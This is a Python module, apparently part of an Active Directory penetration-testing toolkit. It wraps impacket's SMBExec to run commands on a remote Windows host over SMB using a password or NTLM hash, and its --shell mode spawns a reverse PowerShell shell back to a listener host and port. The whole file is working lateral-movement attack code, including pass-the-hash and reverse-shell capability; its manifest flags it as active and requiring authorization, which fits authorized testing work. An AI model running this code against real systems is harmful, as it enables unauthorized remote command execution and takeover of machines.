"""SMBExec -- semi-interactive shell via SMB (no binary upload).

Supports --shell for interactive PTY session after execution.
"""

from __future__ import annotations

import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.lateral.smbexec.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["smb_service_creation", "remote_command_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1569.002", "T1021.002"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    if not cred.has_password and not cred.has_hash:
        print("[!] SMBExec requires credentials", file=sys.stderr)
        return 1

    shell_mode = getattr(args, "shell", False)
    print("[*] SMBExec → {} ({}\\{}){}".format(
        args.target, args.domain, cred.username,
        " [interactive shell]" if shell_mode else ""))

    try:
        from impacket.examples.smbexec import CMDEXEC
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    if shell_mode:
        lhost = getattr(args, "lhost", None)
        lport = int(getattr(args, "lport", 4444))
        shell_type = getattr(args, "shell_type", "powershell")

        if not lhost:
            print("[!] --shell requires --lhost", file=sys.stderr)
            return 1

        from adxpl.core.shell_mixin import spawn_ad_shell

        def _exec_payload(payload: str) -> None:
            executer = CMDEXEC(
                payload,
                username=cred.username, password=cred.password or "",
                domain=args.domain,
                hashes=cred.impacket_hash if cred.has_hash else None,
                share="C$", mode="SHARE",
            )
            executer.run(args.target)

        ok = spawn_ad_shell(
            target=args.target, lhost=lhost, lport=lport,
            shell_type=shell_type, execute_fn=_exec_payload,
        )
        return 0 if ok else 1

    try:
        executer = CMDEXEC(
            "whoami",
            username=cred.username, password=cred.password or "",
            domain=args.domain,
            hashes=cred.impacket_hash if cred.has_hash else None,
            share="C$", mode="SHARE",
        )
        executer.run(args.target)
        print("[+] SMBExec command executed")
        return 0
    except Exception as exc:
        print("[-] SMBExec failed: {}".format(exc), file=sys.stderr)
        return 1
